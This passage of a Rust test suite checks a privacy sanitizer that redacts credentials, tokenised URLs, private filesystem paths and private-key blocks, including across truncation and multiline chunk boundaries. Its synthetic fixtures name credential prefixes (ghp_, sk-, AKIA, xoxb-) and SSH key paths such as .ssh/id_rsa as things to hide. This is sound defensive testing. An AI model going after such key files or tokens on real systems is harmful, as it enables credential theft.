            "fragment",
            format!("https://outer.invalid/#next=https%3A%2F%2Finner.invalid%252F{marker}"),
        ),
    ];

    for (case_id, input) in cases {
        for context in [
            SanitizationContext::Evidence,
            SanitizationContext::Diagnostic,
            SanitizationContext::Url,
            SanitizationContext::Path,
            SanitizationContext::CommandResult,
            SanitizationContext::Summary,
            SanitizationContext::Metadata,
        ] {
            let redacted = PrivacySanitizer::sanitize(context, &input);
            assert!(
                !redacted.contains(marker),
                "nested URL case {case_id} retained its controlled marker"
            );
            assert!(
                !redacted.contains("https%3A%2F%2Finner.invalid"),
                "nested URL case {case_id} retained a raw encoded URL prefix"
            );
            assert!(
                redacted.contains("[redacted-url]"),
                "nested URL case {case_id} was not replaced atomically"
            );
            let expected = match case_id {
                "path" => "https://outer.invalid/redirect/[redacted-url]",
                "fragment" => "https://outer.invalid/#next=[redacted-url]",
                _ => "https://outer.invalid/?next=[redacted-url]",
            };
            assert!(
                redacted == expected,
                "nested URL case {case_id} did not preserve the outer component shape"
            );
            assert_eq!(
                PrivacySanitizer::sanitize(context, &redacted),
                redacted,
                "nested URL case {case_id} was not idempotent"
            );
        }
    }
}

#[test]
fn url_paths_hide_sensitive_filesystem_shapes_and_encoded_segments() {
    let marker = "TT_PRIVACY_URL_PATH_USER_25";
    let cases = [
        format!("https://example.invalid/home/{marker}/.ssh/id_rsa?mode=view"),
        format!("https://example.invalid/home/{marker}/%2Essh/id%5Frsa?mode=view"),
        format!("https://example.invalid/%68%6f%6d%65%2f{marker}%2f%2essh%2fid_rsa"),
        format!("https://example.invalid/Users/{marker}/Library/Application%20Support/private"),
        format!("https://example.invalid/C:/Users/{marker}/.ssh/id_ed25519"),
        format!("file:///home/{marker}/.ssh/id_rsa"),
        format!("file:///Users/{marker}/.ssh/id_ed25519"),
        format!("file:///C:/Users/{marker}/.ssh/id_rsa"),
        format!("file://server/share/Users/{marker}/private"),
    ];

    for input in cases {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Url, &input);
        assert!(
            !redacted.contains(marker),
            "sensitive URL path retained a controlled username"
        );
        assert!(redacted.contains("[sensitive-path]"));
    }
}

#[test]
fn diagnostic_url_paths_hide_private_paths_and_query_credentials() {
    let user_marker = "TT_PRIVACY_DIAGNOSTIC_URL_USER_25";
    let secret_marker = "TT_PRIVACY_DIAGNOSTIC_URL_SECRET_25";
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Diagnostic,
        &format!(
            "request failed for https://example.invalid/home/{user_marker}/My%20Project/.ssh/id_rsa?token={secret_marker}"
        ),
    );

    assert!(!redacted.contains(user_marker));
    assert!(!redacted.contains(secret_marker));
    assert!(!redacted.contains("id_rsa"));
    assert!(redacted.contains("https://example.invalid/<path>?token=[redacted-secret]"));
}

#[test]
fn ordinary_url_and_dsn_paths_remain_analytically_useful() {
    for safe in [
        "https://example.invalid/api/v1/models",
        "https://docs.example.invalid/security/secrets-management",
        "https://example.invalid/api/tokenization",
        "https://example.invalid/docs/credential-rotation",
        "postgres://db.example.invalid/application",
        "ssh://host.example.invalid/repos/project",
        "git+https://example.invalid/org/repository",
    ] {
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::Url, safe),
            safe
        );
    }
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, "file:///safe/path"),
        "file:///[sensitive-path]"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(
            SanitizationContext::Url,
            "https://example%2Einvalid/api/v1/models"
        ),
        "https://example%2Einvalid/api/v1/models",
        "decoded authority bytes are classification-only"
    );
}

#[test]
fn sanitizer_redacts_short_high_confidence_credential_forms() {
    for credential in [
        "ghp_12345678",
        "sk-abcdefgh",
        "AKIA1234567890AB",
        "xoxb-12345678",
        "eyJ_12345678.segment_5678.segment_9012",
    ] {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Summary, credential);
        assert!(
            !redacted.contains(credential),
            "short high-confidence credential was classified but emitted"
        );
        assert!(redacted.contains("[redacted-secret]"));
    }
}

fn input_with_tail_at(start: usize, tail: &str) -> String {
    let prefix = "safe-prefix";
    assert!(start >= prefix.len());
    format!("{prefix}{}{}", " ".repeat(start - prefix.len()), tail)
}

#[test]
fn bounded_truncation_fails_closed_for_ambiguous_lexical_tails() {
    let cases = [
        (
            "base64",
            "QWxhZGRpbjpvcGVuIHNlc2FtZQ==TT_PRIVACY_BASE64_TAIL_25",
            MAX_INPUT_BYTES - 10,
        ),
        (
            "known-prefix",
            "sk-abcdefTT_PRIVACY_KNOWN_PREFIX_TAIL_25",
            MAX_INPUT_BYTES - 10,
        ),
        (
            "assignment",
            "TOKEN=TT_PRIVACY_ASSIGNMENT_TAIL_25",
            MAX_INPUT_BYTES - 4,
        ),
        (
            "url-credential",
            "https://uTT_PRIVACY_URL_CREDENTIAL_TAIL_25",
            MAX_INPUT_BYTES - 10,
        ),
        (
            "opaque",
            "TT_PRIVACY_OPAQUE_TAIL_25_abcdefghijklmnopqrstuvwxyz",
            MAX_INPUT_BYTES - 10,
        ),
        (
            "safe-text",
            "ordinary-safe-tail-that-crosses-the-boundary",
            MAX_INPUT_BYTES - 10,
        ),
    ];

    for (case_id, tail, start) in cases {
        let input = input_with_tail_at(start, tail);
        let retained_prefix = &tail[..MAX_INPUT_BYTES - start];
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);

        assert!(
            !redacted.contains(retained_prefix),
            "truncated {case_id} tail retained an ambiguous lexical prefix"
        );
        assert!(redacted.starts_with("safe-prefix"));
        assert!(redacted.contains("[truncated-tail]"));
        assert!(redacted.len() <= 512);
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::Evidence, &redacted),
            redacted,
            "truncated {case_id} tail was not idempotent"
        );
    }
}

#[test]
fn truncated_quoted_assignment_tail_drops_internal_space_suffix() {
    let tail = "TOKEN=\"fixture secret with spaces TT_PRIVACY_QUOTED_TAIL_25";
    let input = input_with_tail_at(MAX_INPUT_BYTES - 24, tail);
    let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);

    assert!(!redacted.contains("fixture secret"));
    assert!(!redacted.contains("TT_PRIVACY_QUOTED_TAIL_25"));
    assert!(redacted.starts_with("safe-prefix"));
    assert!(redacted.contains("[truncated-tail]"));
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Evidence, &redacted),
        redacted
    );
}

#[test]
fn credentials_ending_before_or_at_the_input_cap_remain_classified() {
    let credential = "sk-abcdefghijklmnopqrstuvwxyz0123456789";
    for (case_id, input_length) in [
        ("ends-before-cap", MAX_INPUT_BYTES - 1),
        ("reaches-cap", MAX_INPUT_BYTES),
    ] {
        let start = input_length - credential.len();
        let input = input_with_tail_at(start, credential);
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);

        assert!(
            !redacted.contains(credential),
            "complete credential {case_id} survived classification"
        );
        assert!(redacted.contains("[redacted-secret]"));
    }
}

#[test]
fn credential_after_the_input_cap_is_not_promoted_into_output() {
    let tail = "sk-abcdefghijklmnopqrstuvwxyz0123456789";
    let input = input_with_tail_at(MAX_INPUT_BYTES + 10, tail);
    let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);

    assert!(!redacted.contains(tail));
    assert!(redacted.starts_with("safe-prefix"));
    assert!(redacted.len() <= 512);
}

#[test]
fn utf8_truncation_near_the_boundary_is_safe_deterministic_and_private() {
    let tail = "TT_PRIVACY_UTF8_TAIL_25界界界界界";
    let input = input_with_tail_at(MAX_INPUT_BYTES - 24, tail);
    let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);

    assert!(!redacted.contains("TT_PRIVACY_UTF8_TAIL_25"));
    assert!(redacted.len() <= 512);
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input),
        redacted
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Evidence, &redacted),
        redacted
    );
}

#[test]
fn long_benign_input_preserves_a_useful_safe_prefix() {
    let input = format!("safe-prefix {}", "ordinary-safe-word ".repeat(1_000));
    let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);

    assert!(redacted.starts_with("safe-prefix ordinary-safe-word"));
    assert!(redacted.contains("ordinary-safe-word"));
    assert!(redacted.len() <= 512);
}

#[test]
fn work_budget_non_escape_percent_avoids_encoded_candidate_scans() {
    for (text, expected) in [
        ("%", false),
        ("%2", false),
        ("%zz", false),
        ("%2g", false),
        ("%π", false),
        ("%00", true),
        ("%aF", true),
        ("%%20", true),
        ("%252f", true),
    ] {
        assert_eq!(super::has_percent_escape(text), expected);
    }
    let text = format!("needle {}%", "ordinary ".repeat(368));
    let mut visits = 0usize;
    PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, &text, &mut |bytes| {
        visits += bytes;
        if visits > 1_000_000 {
            Err("work budget")
        } else {
            Ok(())
        }
    })
    .expect("a literal percent sign needs no encoded URL search");
    // Both helpers must reject the non-escape before their candidate loop,
    // including the path used while inspecting nested URL components.
    let punctuation = format!("{}%zz", ":".repeat(4_000));
    assert!(super::find_encoded_url_candidate(&punctuation, 0, &[]).is_none());
    let mut component_visits = 0;
    assert_eq!(
        super::decode_url_component_for_inspection(&punctuation, &mut |bytes| {
            component_visits += bytes;
            if component_visits > 100_000 {
                Err("component budget")
            } else {
                Ok(())
            }
        })
        .unwrap(),
        punctuation,
    );
    let encoded = "https%3a%2f%2fexample.invalid%2f%3ftoken%3dSYNTHETIC";
    assert!(super::find_encoded_url_candidate(encoded, 0, &[]).is_some());
    let mut reserved = false;
    assert!(
        PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, encoded, &mut |bytes| {
            if bytes == encoded.len() * encoded.len() * 4 {
                reserved = true;
                Err("encoded scan reservation")
            } else {
                Ok(())
            }
        },)
        .is_err()
    );
    assert!(reserved);
    let sanitized = PrivacySanitizer::sanitize(SanitizationContext::Evidence, encoded);
    assert!(!sanitized.contains("SYNTHETIC"));
    assert!(sanitized.len() <= 512);
}

#[test]
fn work_budget_percent_fast_path_preserves_synthetic_redaction_outputs() {
    use sha2::{Digest, Sha256};

    let suffixes = [
        "~",
        "%",
        "%z",
        "%zz",
        "%2g",
        "%20",
        "%25",
        "%252f",
        "%68%74%74%70%73%3a%2f%2fexample.invalid%2f%3ftoken%3dSYNTHETIC",
    ];
    let mut digest = Sha256::new();
    let mut cases = 0;
    for length in [0, 1, 16, 80, 368, 500] {
        for suffix in suffixes {
            for prefix in [
                "needle ",
                "token=SYNTHETIC ",
                "https://example.invalid/?token=SYNTHETIC ",
                "π ordinary ",
            ] {
                let input = format!("{prefix}{}{suffix}", "ordinary ".repeat(length));
                let output = PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input);
                digest.update((output.len() as u64).to_le_bytes());
                digest.update(output.as_bytes());
                cases += 1;
            }
        }
    }
    assert_eq!(cases, 216);
    // Pin the pre-optimization output, including truncation and redaction;
    // this regression changes visited work, not any emitted text.
    assert_eq!(
        hex::encode(digest.finalize()),
        "38146e099800500680c449b99f088770071d00f7e04e24ea03b743a55d52415b"
    );
}

#[test]
fn nested_url_assignment_work_is_reserved_before_assignment_scan() {
    let text = format!("https://example.invalid/{}", "abc.".repeat(750));
    let mut visits = 0usize;
    PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, &text, &mut |bytes| {
        visits += bytes;
        Ok::<_, ()>(())
    })
    .unwrap();
    // The URL owner must reserve its reached nested assignment scan, not
    // rely on a later outer assignment reservation after inspection.
    assert!(visits > 1_000_000);
    let path = format!("/{}", "abc.".repeat(750));
    let mut nested_visits = 0usize;
    assert_eq!(
        super::redact_url_path(&path, 0, false, &mut |bytes| {
            nested_visits += bytes;
            if nested_visits > 1_000_000 {
                Err("nested assignment budget")
            } else {
                Ok(())
            }
        }),
        Err("nested assignment budget")
    );
    let punctuation = ":".repeat(4_000);
    assert!(super::find_encoded_url_candidate(&punctuation, 0, &[]).is_none());
    assert_eq!(
        super::decode_url_component_for_inspection(&punctuation, &mut |_| Ok::<_, ()>(())).unwrap(),
        punctuation
    );
}

#[test]
fn quoted_ordinary_output_reserves_reached_assignment_work_and_redacts_secrets() {
    let input = format!(
        "{{\"api_key\":\"SYNTHETIC-ASSIGNMENT-SECRET\"}}\n{}",
        "{\"ordinary\":\"compiler diagnostic\"}\n".repeat(120)
    );
    let mut visits = 0usize;
    let output =
        PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, &input, &mut |bytes| {
            visits += bytes;
            if visits > 8 * 1024 * 1024 {
                Err("budget")
            } else {
                Ok(())
            }
        })
        .expect("ordinary quoted output must not reserve an entire quadratic preview");
    assert!(!output.contains("SYNTHETIC-ASSIGNMENT-SECRET"));
    assert_eq!(
        output,
        PrivacySanitizer::sanitize(SanitizationContext::Evidence, &input)
    );
    let malicious = "x".repeat(4_000);
    let mut used = 0usize;
    assert!(
        PrivacySanitizer::try_sanitize(SanitizationContext::Evidence, &malicious, &mut |bytes| {
            used += bytes;
            if used > 8 * 1024 * 1024 {
                Err("budget")
            } else {
                Ok(())
            }
        })
        .is_err(),
        "quadratic key attempts still fail before unbounded work"
    );
}

#[test]
fn multiline_redaction_keeps_line_breaks_and_collapses_other_whitespace() {
    use super::redact_multiline_bounded;

    let (out, truncated) = redact_multiline_bounded("line   one\t\there\r\nline   two\n", 4096);
    assert_eq!(out, "line one here\nline two\n");
    assert!(!truncated);
    let (again, _) = redact_multiline_bounded(&out, 4096);
    assert!(again == out, "output is a fixed point");
}

#[test]
fn multiline_redaction_hides_a_token_across_an_internal_chunk_boundary() {
    use super::{MAX_INPUT_BYTES, redact_multiline_bounded};

    // Indented filler collapses, so a token that straddles the first
    // chunk's input bound lands well inside the output cap.
    let filler = format!("x{}\n", " ".repeat(60)).repeat(65);
    let token = synthetic_token("ghp_", 40, 7);
    let padding = " ".repeat(MAX_INPUT_BYTES - 16 - filler.len() - "alpha".len());
    let input = format!("{filler}alpha{padding}{token} omega\n");
    let token_start = filler.len() + "alpha".len() + padding.len();
    assert!(token_start < MAX_INPUT_BYTES && token_start + token.len() > MAX_INPUT_BYTES);

    let (out, truncated) = redact_multiline_bounded(&input, 4096);
    assert!(!truncated, "the whole record fits the output cap");
    assert!(out.ends_with("alpha [redacted-secret] omega\n"));
    assert!(!shows_marker_window(&out, &token), "token window visible");
}

#[test]
fn multiline_redaction_fails_closed_on_an_unbroken_secret_line() {
    use super::redact_multiline_bounded;

    let secret = synthetic_letters(5000, 11);
    let (out, truncated) = redact_multiline_bounded(&format!("api_key={secret}"), 4096);
    assert!(truncated);
    assert!(!shows_marker_window(&out, &secret), "secret window visible");
    assert!(out.len() <= 4096);
}

/// A construct that can span a line, with the markers a single sanitizer
/// call hides.
struct SpanCase {
    template: &'static str,
    /// Whether one call is expected to hide every marker.
    hidden: bool,
}

const SPAN_CASES: &[SpanCase] = &[
    SpanCase {
        template: "password\n= {M}\n",
        hidden: true,
    },
    SpanCase {
        template: "password =\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "api_key:\n\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "\"client_secret\"\n: \"{M}\"\n",
        hidden: true,
    },
    SpanCase {
        template: "--token\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "secret: |\n  {M}\n  {N}\nnext: plain\n",
        hidden: true,
    },
    SpanCase {
        template: "token: >\n\n  {M}\nafter\n",
        hidden: true,
    },
    SpanCase {
        template: "pass\\x77ord\\x3d\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "api_key: |\n\\x20{M}\nafter\n",
        hidden: true,
    },
    SpanCase {
        template: "npm install\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "pnpm\nadd {M}\n",
        hidden: true,
    },
    SpanCase {
        template: "Bearer\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "Basic\n\n{M}\n",
        hidden: true,
    },
    SpanCase {
        template: "-----BEGIN RSA PRIVATE KEY-----\n{M}\n{N}\n-----END RSA PRIVATE KEY-----\nafter\n",
        hidden: true,
    },
    SpanCase {
        template: "-----BEGIN\nPRIVATE KEY-----\n{M}\n{N}\n",
        hidden: true,
    },
    SpanCase {
        template: "C:\\Users\\{M}\n{N}\\file.txt\n",
        hidden: true,
    },
    SpanCase {
        template: "/home/{M}\n{N}/notes.txt\n",
        hidden: true,
    },
    SpanCase {
        template: "~/{M}\n\n{N}/x\n",
        hidden: true,
    },
    SpanCase {
        template: "\\\\fileserver\\{M}\n{N}\\doc\n",
        hidden: true,
    },
    SpanCase {
        template: "see https://example.invalid/a?token={M}\n",
        hidden: true,
    },
    SpanCase {
        template: "https%3A%2F%2Fexample.invalid%2F%20password%3D\n{M}\n",
        hidden: false,
    },
    SpanCase {
        template: "ghp_{M}{N}\n",
        hidden: true,
    },
    SpanCase {
        template: "x x x x x x x x x x x x x x x x x x x x /srv/{M} {N}/d y y y y y y y y y y y y y y y y y y\n",
        hidden: true,
    },
    SpanCase {
        template: "x x x x x x x x x x /srv/{M} {N} tail/d y y y y y y y y y y y y y y y y y y\n",
        hidden: true,
    },
    SpanCase {
        template: "/srv/{M}\n{N} tail/d y y y y y y y y y y y y y y y y y y y y y y y y y y y y y\n",
        hidden: true,
    },
    SpanCase {
        template: "C:\\Data\\{M} {N} tail\\d y y y y y y y y y y y y y y y y y y y y y y y y\n",
        hidden: true,
    },
    SpanCase {
        template: "y y y y y y y y y y y y y y y y y y y y password=\"{M} {N}\" z z z z z z z z z z z z z z\n",
        hidden: true,
    },
    SpanCase {
        template: "w w w w w w w w w w w w w w w w w w w w w w w w Bearer {M} v v v v v v v v v v v\n",
        hidden: true,
    },
];

const MARKER_FIELDS: [&str; 2] = ["{M}", "{N}"];
const MARKER_WINDOW: usize = 6;

/// Deterministic mixed-case letters: never an encoded blob or token on
/// their own, so only the construct around them hides them.
fn synthetic_letters(length: usize, seed: u64) -> String {
    let mut state = seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1;
    (0..length)
        .map(|index| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            let letter = b'a' + u8::try_from(state % 26).expect("letter offset");
            char::from(if index == 0 || (index % 3 == 1 && index != 1) {
                letter.to_ascii_uppercase()
            } else {
                letter
            })
        })
        .collect()
}

fn synthetic_token(prefix: &str, length: usize, seed: u64) -> String {
    format!("{prefix}{}", synthetic_letters(length, seed))
}

fn shows_marker_window(output: &str, marker: &str) -> bool {
    marker
        .as_bytes()
        .windows(MARKER_WINDOW)
        .any(|window| output.contains(std::str::from_utf8(window).expect("ASCII marker")))
}

fn span_case_input(case: &SpanCase, case_index: usize, lead: usize) -> (String, Vec<String>) {
    let markers = (0..MARKER_FIELDS.len())
        .map(|field| synthetic_letters(16, (case_index * 7 + field + 1) as u64))
        .collect::<Vec<_>>();
    let mut construct = case.template.to_owned();
    for (field, marker) in MARKER_FIELDS.iter().zip(&markers) {
        construct = construct.replace(field, marker);
    }
    // The lead shifts the construct, and every cut inside it, against
    // the chunk bounds.
    let input = format!(
        "fill line\nfill line\n{} {construct}fill line\nfill end\n",
        "p".repeat(lead)
    );
    (input, markers)
}

#[test]
fn multiline_chunk_cuts_never_show_what_one_call_hides() {
    use super::{MAX_INPUT_BYTES, MAX_MULTILINE_INPUT_BYTES, redact_multiline_with_limits};

    const CHUNKS: [usize; 4] = [24, 41, 64, 97];
    for (case_index, case) in SPAN_CASES.iter().enumerate() {
        for lead in 0..CHUNKS[CHUNKS.len() - 1] {
            let (input, markers) = span_case_input(case, case_index, lead);
            assert!(input.len() <= MAX_INPUT_BYTES);
            let (single, _) = redact_multiline_with_limits(
                &input,
                MAX_INPUT_BYTES,
                MAX_INPUT_BYTES,
                MAX_MULTILINE_INPUT_BYTES,
            );
            for chunk in CHUNKS.into_iter().filter(|chunk| lead < *chunk) {
                let (chunked, _) = redact_multiline_with_limits(
                    &input,
                    MAX_INPUT_BYTES,
                    chunk,
                    MAX_MULTILINE_INPUT_BYTES,
                );
                for (field, marker) in MARKER_FIELDS.iter().zip(&markers) {
                    if !case.template.contains(field) {
                        continue;
                    }
                    let hidden = !shows_marker_window(&single, marker);
                    assert!(
                        hidden || !case.hidden,
                        "case {case_index} field {field}: one call does not hide it"
                    );
                    assert!(
                        !hidden || !shows_marker_window(&chunked, marker),
                        "case {case_index}/{chunk}/{lead} field {field}: chunked output shows it"
                    );
                }
            }
        }
    }
}

#[test]
fn multiline_input_cut_never_shows_what_one_call_hides() {
    use super::{MAX_INPUT_BYTES, MAX_MULTILINE_INPUT_BYTES, redact_multiline_with_limits};

    for (case_index, case) in SPAN_CASES.iter().enumerate() {
        let (input, markers) = span_case_input(case, case_index, 3);
        let (single, _) = redact_multiline_with_limits(
            &input,
            MAX_INPUT_BYTES,
            MAX_INPUT_BYTES,
            MAX_MULTILINE_INPUT_BYTES,
        );
        for input_limit in 1..input.len() {
            let (cut, truncated) =
                redact_multiline_with_limits(&input, MAX_INPUT_BYTES, 41, input_limit);
            assert!(
                truncated,
                "case {case_index}/{input_limit}: cut not reported"
            );
            for (field, marker) in MARKER_FIELDS.iter().zip(&markers) {
                if case.template.contains(field) && !shows_marker_window(&single, marker) {
                    assert!(
                        !shows_marker_window(&cut, marker),
                        "case {case_index}/{input_limit} field {field}: input cut shows it"
                    );
                }
            }
        }
    }
}

#[test]
fn multiline_output_is_a_fixed_point_and_within_the_cap() {
    use super::{
        MAX_MULTILINE_INPUT_BYTES, redact_multiline_bounded, redact_multiline_with_limits,
    };

    for (case_index, case) in SPAN_CASES.iter().enumerate() {
        let (input, _) = span_case_input(case, case_index, 5);
        for maximum in [64, 100, 4096] {
            let (out, truncated) =
                redact_multiline_with_limits(&input, maximum, 41, MAX_MULTILINE_INPUT_BYTES);
            assert!(
                out.len() <= maximum,
                "case {case_index}/{maximum}: over the cap"
            );
            let (again, _) = redact_multiline_bounded(&out, maximum);
            // Compared without printing either side: both can hold markers.
            assert!(
                again == out,
                "case {case_index}/{maximum}: not a fixed point"
            );
            if truncated {
                assert!(
                    out.ends_with("[truncated]"),
                    "case {case_index}/{maximum}: unmarked cut"
                );
            }
        }
    }
}

/// `line` padded to one full chunk, so the newline after it is the only
/// cut before `rest`.
fn padded_to_a_chunk(line: &str, rest: &str) -> String {
    format!(
        "{}{line}\n{rest}",
        " ".repeat(super::MAX_INPUT_BYTES - line.len())
    )
}

const PLANTED: &str = "AbCdEfGh";

#[test]
fn multiline_guards_fold_case_as_their_passes_do() {
    use super::redact_multiline_bounded;

    // The passes match with `(?i)`, so the Kelvin sign is `k` and the
    // long s is `s`: a guard must refuse the cut for those spellings too.
    let cases = [
        (
            "armor",
            padded_to_a_chunk(
                "https%3A%2F%2Fexample.invalid%2Ffoo%20-----BEGIN%20\u{212A}",
                "PRIVATE KEY-----\nAbCdEfGh",
            ),
            4096,
        ),
        (
            "package manager",
            padded_to_a_chunk("npm in\u{17f}tall", "AbCdEfGh"),
            4096,
        ),
        (
            "basic",
            padded_to_a_chunk("Ba\u{17f}ic", "AbCdEfGh\nordinary filler"),
            26,
        ),
    ];
    for (case, input, limit) in cases {
        let (out, _) = redact_multiline_bounded(&input, limit);
        assert!(
            !out.contains(&PLANTED[..7]),
            "case {case} field text: planted credential shown"
        );
    }
}

#[test]
fn multiline_reads_url_text_before_private_key_blocks() {
    use super::{collapse_intraline_whitespace, redact_multiline_bounded, redact_sensitive_text};

    let cases = [
        (
            "bracket host",
            "auth: https://[-----BEGIN PRIVATE KEY-----x-----END PRIVATE KEY----- AbCdEfGh",
            PLANTED,
        ),
        (
            "query",
            "https://example.invalid/?q=sk-AbCdEf-----BEGIN PRIVATE KEY-----",
            &PLANTED[..6],
        ),
    ];
    for (case, line, planted) in cases {
        let single = collapse_intraline_whitespace(&redact_sensitive_text(line));
        assert!(!single.contains(planted), "case {case}: one call shows it");
        // Fits one call: exactly the single call.
        let (out, truncated) = redact_multiline_bounded(line, 4096);
        assert!(
            out == single && !truncated,
            "case {case} field text: differs from one call"
        );
        // Chunked: the line is the first chunk's first line.
        let long = format!("{line}\n{}", "filler;\n".repeat(600));
        let (out, _) = redact_multiline_bounded(&long, 4096);
        assert!(
            out.split('\n').next() == Some(single.as_str()),
            "case {case} field text: chunked line differs from one call"
        );
    }
}

#[test]
fn multiline_hard_cut_drops_a_drive_prefix() {
    use super::redact_multiline_bounded;

    let input = format!("{}C:\\Toy Name.txt", " ".repeat(4089));
    let (out, truncated) = redact_multiline_bounded(&input, 4096);
    assert!(out == "[truncated]" && truncated, "drive field text: shown");
    let input = format!("{}see D:\\Synthetic Dir\\x", "w ".repeat(2040));
    let (out, truncated) = redact_multiline_bounded(&input, 4096);
    assert!(
        truncated && out.ends_with("see [truncated]"),
        "drive in a line field text: shown"
    );
}

#[test]
fn multiline_newline_normalization_stops_at_the_input_cap() {
    use super::normalize_newlines_bounded;

    assert_eq!(
        normalize_newlines_bounded("a\r\nb\rc\n", 64),
        ("a\nb\nc\n".to_owned(), false)
    );
    // A CRLF at the cap is read whole.
    let (out, over) = normalize_newlines_bounded("xxxx\r\nyyyy", 5);
    assert!(over);
    assert!(out.starts_with("xxxx\ny") && !out.contains('\r'));
    // The work is bounded by the cap, not the input.
    let long = "a\r\n".repeat(1 << 20);
    let (out, over) = normalize_newlines_bounded(&long, 1024);
    assert!(over);
    assert!(out.len() <= 1024 + 4, "copied {} bytes", out.len());
}

#[test]
fn multiline_short_limits_have_exact_outputs() {
    use super::redact_multiline_bounded;

    let input = "password=x and some ordinary words";
    let expected = [
        (1, ""),
        (10, ""),
        (11, "[truncated]"),
        (12, "[truncated]"),
        (13, "p [truncated]"),
        (20, "password [truncated]"),
        (25, "password [truncated]"),
        (40, "password=[redacted-secret] a [truncated]"),
        (50, "password=[redacted-secret] and some ordinary words"),
    ];
    for (limit, text) in expected {
        let (out, truncated) = redact_multiline_bounded(input, limit);
        assert_eq!(out, text, "limit {limit}");
        assert_eq!(truncated, limit < 50, "limit {limit}: truncated flag");
    }
    // `password=x` redacts to 26 bytes; at 21 the cut before the value
    // would read as a new assignment, so it backs off to the key.
    assert_eq!(
        redact_multiline_bounded("password=x", 21),
        ("password [truncated]".to_owned(), true)
    );
    assert_eq!(
        redact_multiline_bounded("password=x", 26),
        ("password=[redacted-secret]".to_owned(), false)
    );
}

#[test]
fn multiline_fit_comes_after_the_whole_text_is_redacted() {
    use super::redact_then_fit;

    // Joined text that is not yet a fixed point, as a missed cut guard
    // would leave it: the cut to fit must not keep a prefix of the
    // credential that only the whole text shows to be one.
    let cases = [
        (
            "basic across a join",
            "Ba\u{17f}ic\nAbCdEfGh\nordinary filler",
            26,
        ),
        ("basic in a line", "Basic AbCdEfGhIjKl", 22),
    ];
    for (case, body, limit) in cases {
        let (out, _) = redact_then_fit(body.to_owned(), false, limit);
        assert!(out.len() <= limit, "case {case}: over the cap");
        assert!(
            !out.contains(&PLANTED[..4]),
            "case {case} field text: planted credential prefix shown"
        );
    }
}

#[test]
fn multiline_fit_follows_the_complete_redaction() {
    use super::redact_multiline_bounded;

    // Redacted to a fixed point before the cut: every kept prefix is a
    // prefix of the full output.
    for (case_index, case) in SPAN_CASES.iter().enumerate() {
        let (input, _) = span_case_input(case, case_index, 3);
        let (full, _) = redact_multiline_bounded(&input, 4096);
        for limit in [16, 24, 32, 48, 64, 100] {
            let (out, truncated) = redact_multiline_bounded(&input, limit);
            assert!(
                out.len() <= limit,
                "case {case_index}/{limit}: over the cap"
            );
            let kept = out.strip_suffix("[truncated]").unwrap_or(&out).trim_end();
            assert!(
                full.starts_with(kept) && (truncated || out == full),
                "case {case_index}/{limit} field text: not a prefix of the full output"
            );
        }
    }
}

#[test]
fn multiline_never_shows_what_one_sanitizer_call_hides() {
    use super::{MAX_INPUT_BYTES, redact_multiline_bounded, redact_sensitive_text};

    for (case_index, case) in SPAN_CASES.iter().enumerate() {
        let (input, markers) = span_case_input(case, case_index, 3);
        let single = redact_sensitive_text(&input);
        let lead = "filler;\n".repeat((MAX_INPUT_BYTES - input.len() / 2) / 8);
        let forms = [
            ("fits", input.clone()),
            ("first chunk", format!("{input}{}", "filler;\n".repeat(600))),
            ("across a chunk", format!("{lead}{input}")),
        ];
        for (form, text) in forms {
            let (out, _) = redact_multiline_bounded(&text, MAX_INPUT_BYTES);
            for (field, marker) in MARKER_FIELDS.iter().zip(&markers) {
                if case.template.contains(field) && !shows_marker_window(&single, marker) {
                    assert!(
                        !shows_marker_window(&out, marker),
                        "case {case_index} {form} field {field}: shown"
                    );
                }
            }
        }
    }
}

#[test]
fn multiline_cut_guards_refuse_what_their_passes_read_across() {
    use super::{MultilineSource, url_pass_line};

    // (case, line before the cut, line after it, safe to cut)
    let cases = [
        ("plain", "ordinary words", "AbCdEfGh", true),
        ("basic", "Basic", "AbCdEfGh", false),
        ("basic folded", "Ba\u{17f}ic", "AbCdEfGh", false),
        ("bearer", "Bearer", "AbCdEfGh", false),
        ("phrase", "RSA", "PRIVATE KEY", false),
        ("phrase folded", "R\u{17f}A", "PRIVATE KEY", false),
        ("label", "api", "key AbCdEfGh", false),
        ("decoder folded", "ba\u{17f}e64", "--decode", false),
        ("manager word", "pnpm", "add AbCdEfGh", false),
        ("subcommand", "npm install", "AbCdEfGh", false),
        ("subcommand folded", "npm in\u{17f}tall", "AbCdEfGh", false),
        (
            "subcommand wide space",
            "npm\u{3000}install",
            "AbCdEfGh",
            false,
        ),
        ("secret key", "password =", "AbCdEfGh", false),
        ("secret key folded", "api_\u{212A}ey:", "AbCdEfGh", false),
        ("quote", "\"client_secret\"", ": \"AbCdEfGh\"", false),
        ("escape", "pass\\x77ord", "AbCdEfGh", false),
        (
            "escape before wide space",
            "pass\\x77\u{3000}ord",
            "AbCdEfGh",
            false,
        ),
